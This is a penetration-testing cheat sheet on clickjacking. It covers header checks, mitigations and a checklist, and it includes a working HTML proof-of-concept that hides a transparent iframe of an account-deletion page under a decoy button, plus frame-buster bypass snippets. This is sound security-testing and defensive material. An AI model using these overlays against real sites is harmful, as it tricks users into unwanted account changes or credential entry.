# 🖼️ Clickjacking (UI Redress) Cheat Sheet

> **Quick reference** for testing whether a page can be framed and overlaid.

> ⚠️ **Scope note:** Only test applications you own or have explicit written permission to assess. Build PoCs against your own accounts (`<USER>`) and never publish them against real users.

---

### 🧭 **1. Quick Reference**

| Control | Strong value |
|---------|--------------|
| `X-Frame-Options` | `DENY` or `SAMEORIGIN` |
| CSP `frame-ancestors` | `'none'` or `'self'` |
| Legacy `ALLOW-FROM` | Deprecated — do not rely on it |
| JS frame-buster | Bypassable; not a primary defense |
| `SameSite=Lax` | Helps, but does not stop framing itself |

---

### 🔍 **2. Detection**

```bash
# Check framing headers on the target page
curl -sI 'https://<TARGET>/account' | grep -iE 'x-frame-options|content-security-policy'
```

| Result | Assessment |
|--------|------------|
| No header and no `frame-ancestors` | Likely frameable |
| `X-Frame-Options: SAMEORIGIN` | Cross-origin framing blocked |
| `frame-ancestors 'self'` | Cross-origin framing blocked (preferred control) |
| `ALLOW-FROM <ORIGIN>` | Obsolete; test with modern browsers |
| Conflicting headers | `frame-ancestors` takes precedence over XFO |

```bash
# Minimal frames test page: add to your own site
curl -s -o /dev/null -w '%{http_code}\n' \
  -H 'Referer: <ATTACKER_ORIGIN>' 'https://<TARGET>/account'
```

---

### 🧪 **3. Proof-of-Concept Template**

```html
<html>
<head>
  <title>Clickjacking PoC</title>
  <style>
    #target { position:absolute; top:0; left:0;
              width:700px; height:500px; opacity:0.01; }
    #decoy  { position:absolute; top:220px; left:120px;
              z-index:1; cursor:pointer; }
  </style>
</head>
<body>
  <iframe id="target" src="https://<TARGET>/account/delete"></iframe>
  <button id="decoy">Claim <USER>'s reward</button>
</body>
</html>
```

> ⚠️ The transparent iframe is aligned so a decoy click lands on the sensitive control. Keep the PoC on `<ATTACKER_ORIGIN>` and use only test accounts.

```html
<!-- Variant: double framing to defeat naive frame-busters -->
<iframe src="https://<ATTACKER_ORIGIN>/inner.html"></iframe>
```

---

### 🧩 **4. Bypass Techniques**

| Defense | Bypass idea |
|---------|-------------|
| JS `if (top !== self)` | `sandbox` attribute, double framing, `window.stop()` |
| XFO `SAMEORIGIN` | Framing from a same-origin page via open redirect or XSS |
| Header set only on some routes | Test login, error, and legacy paths |
| Mobile viewport | Touch / long-press UI redress differs from desktop |
| Referer-based check | Strip or spoof `Referer` with `<meta name="referrer">` |
| Frame-busting code loaded async | Race to render before the script runs |

```html
<meta name="referrer" content="no-referrer">
<iframe sandbox="allow-same-origin allow-scripts"
        src="https://<TARGET>/account"></iframe>
```

---

### 🖥️ **5. Validation Flow**

1. Confirm the target URL is frameable from `<ATTACKER_ORIGIN>`.
2. Identify a one-click state-changing action reachable in the frame.
3. Align a decoy UI element over the exact control coordinates.
4. Log in as `<USER>` and perform the click in a real browser.
5. Verify the state change occurred (e.g., account setting modified).
6. Capture before/after evidence without recording real secrets.

```bash
# Verify post-click state with your own session
curl -s -b 'session=<TOKEN>' 'https://<TARGET>/account'
```

---

### 💥 **6. Impact**

- Unwanted state changes performed with the victim's session: deletes, follows, transfers.
- Account settings or permissions modified without user consent.
- Combined with CSRF, enables cross-origin attacks on otherwise protected actions.
- Credential harvesting via overlaid login prompts (phishing-style redress).
- Reputation and compliance damage from silent unauthorized actions.

---

### 🛡️ **7. Mitigation**

- Send `Content-Security-Policy: frame-ancestors 'none'` (or `'self'`) on **all** responses.
- Also set `X-Frame-Options: DENY` for legacy browser compatibility.
- Do not rely on JavaScript frame-busting as the primary control.
- Require re-authentication or a CSRF token for sensitive one-click actions.
- Apply the framing policy to error pages, redirects, and authenticated routes alike.
- Use `SameSite` cookies and user confirmation dialogs as additional layers.

---

### ✅ **8. Testing Checklist**

- [ ] `X-Frame-Options` and `frame-ancestors` inspected
- [ ] Every sensitive route tested for framing
- [ ] Same-origin framing paths (open redirect/XSS) reviewed
- [ ] PoC aligned and verified in a real browser
- [ ] State change confirmed with victim session
- [ ] Mobile viewport tested
- [ ] Frame-buster bypasses attempted

---

### 📚 **9. References**

- [OWASP Clickjacking Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [PortSwigger: Clickjacking](https://portswigger.net/web-security/clickjacking)
- [MDN: X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)
- [MDN: CSP frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors)

---

**🖼️ Frame responsibly.**
